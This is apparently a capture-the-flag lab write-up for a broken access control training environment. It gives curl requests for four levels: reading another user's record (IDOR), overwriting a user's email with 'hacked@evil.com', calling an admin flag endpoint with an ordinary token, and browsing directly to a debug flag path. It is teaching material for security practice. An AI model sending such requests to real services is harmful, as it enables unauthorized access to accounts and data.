# Broken Access Control Lab - Writeup
## Port: 8063 | Kategori: Broken Access Control

## Level 1: IDOR
curl http://target:8063/api/users/2 -H "Authorization: Bearer TOKEN"

## Level 2: Horizontal Privilege Escalation
curl -X PUT http://target:8063/api/users/2 -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"email":"hacked@evil.com"}'

## Level 3: Vertical Privilege Escalation
curl -X POST http://target:8063/api/admin/flag -H "Authorization: Bearer TOKEN"

## Level 4: Forceful Browsing
curl http://target:8063/api/admin/debug/flag

## Standalone Easy Labs
- 8075: Broken Access Control Easy 1 - IDOR
- 8076: Broken Access Control Easy 2 - Horizontal Privilege Escalation
- 8077: Broken Access Control Easy 3 - Vertical Privilege Escalation
- 8078: Broken Access Control Easy 4 - Forceful Browsing
- 8079: Broken Access Control Easy 5 - Path Bypass

Each standalone lab is a self-contained PHP + Apache service with its own port and writeup.
